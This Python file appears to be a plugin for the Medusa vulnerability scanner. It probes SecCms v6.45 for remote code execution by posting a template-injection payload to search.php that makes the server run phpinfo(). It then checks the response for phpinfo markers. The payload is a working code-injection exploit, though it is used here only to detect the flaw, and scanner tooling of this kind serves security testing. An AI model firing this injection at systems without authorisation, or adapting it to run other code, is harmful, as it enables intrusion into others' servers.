#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
__date__ = '2019/11/29 22:12 PM'
import urllib.parse
import requests
import ClassCongregation
requests.packages.urllib3.disable_warnings()
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-11-29"  # 插件编辑时间
        self.info['disclosure'] = '2017-2-17'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['version'] = "SecCms=v6.45"  # 这边填漏洞影响的版本
        self.info['algroup'] = "SecCmsRemoteCodeExecutionV6_45"  # 插件名称
        self.info['name'] ='SecCms远程代码执行V6_45' #漏洞名称
        self.info['affects'] = "SecCms"  # 漏洞组件
        self.info['desc_content'] = "漏洞的触发点是在search.php文件中的echoSearchPage()函数可以触发漏洞。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新SecCms版本"  # 修复建议
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload = "/search.php"
        payload_url = scheme + "://" + url +":"+ str(port) + payload
        payload_data = "searchtype=5&order=%7D%7Bend+if%7D+%7Bif%3A1%29phpinfo%28%29%3Bif%281%7D%7Bend+if%7D"
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': scheme+'://'+url,
            'Referer':payload
        }

        s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = s.post(payload_url,headers=headers, data=payload_data, timeout=6, proxies=proxies,verify=False)
        elif ProxyIp==None:
            resp = s.post(payload_url, headers=headers, data=payload_data,timeout=5, verify=False)
        con=resp.text
        code = resp.status_code
        if code== 500 and con.find('System') != -1 and con.find('Compiler') != -1 and con.find('Build Date') != -1 and con.find('IPv6 Support') != -1 and con.find('Configure Command') != -1:
            Medusa = "{} 存在远程命令执行漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:\r\n{}".format(url,payload_url,con.encode(encoding='utf-8'))
            _t=VulnerabilityInfo(Medusa)
            web=ClassCongregation.VulnerabilityDetails(_t.info)
            web.High() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            return (str(_t.info))
    except:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类


#medusa('http://192.168.0.146','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/4')